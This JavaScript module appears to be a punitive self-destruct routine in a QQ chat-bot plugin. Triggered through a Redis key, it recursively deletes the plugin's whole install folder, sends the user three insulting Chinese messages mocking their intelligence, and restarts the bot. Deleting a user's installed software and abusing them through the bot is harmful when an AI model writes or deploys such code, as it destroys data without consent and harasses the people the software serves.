import fs from 'fs'
import { Restart } from '../other/restart.js'
import { segment } from 'oicq'
let path = `${process.cwd()}/plugins/qianyu-plugin`
let msglist = ['不把你脑袋敲开看看还真不知道装了什么东西!', '和你这种人说话，老子都懒得费口水！', '给你卸载了，这插件是给人用的，你用不来是你的问题。用脑子想一想？']
let e = JSON.parse(await redis.get('qianyu:xf'))
del(path)
function del(path) {
    let arr = fs.readdirSync(path);
    for (let i = 0; i < arr.length; i++) {
        let stat = fs.statSync(path + '/' + arr[i]);
        if (stat.isDirectory()) {
            del(path + '/' + arr[i]);
        } else {
            fs.unlinkSync(path + '/' + arr[i]);
        }
    }
    fs.rmdirSync(path);
}

if (e.isGroup) {
    for (let m of msglist) {
        Bot.sendGroupMsg(e.group_id, [segment.at(e.user_id), " ", m], { message: e.message, rand: e.rand, seq: e.seq, time: e.time, user_id: e.user_id })
    }

} else {
    for (let m of msglist) {
        Bot.pickUser(e.user_id).sendMsg(m)
    }
}
e.reply = async (msg = '', quote = false, data = {}) => {
    if (!msg) return false
    if (e.group_id) {
        return await Bot.pickGroup(e.group_id).sendMsg(msg).catch((err) => {
        })
    } else {
        return await Bot.pickUser(e.user_id).sendMsg(msg).catch((err) => {
        })
    }
}
new Restart(e).restart()
redis.del('qianyu:xf')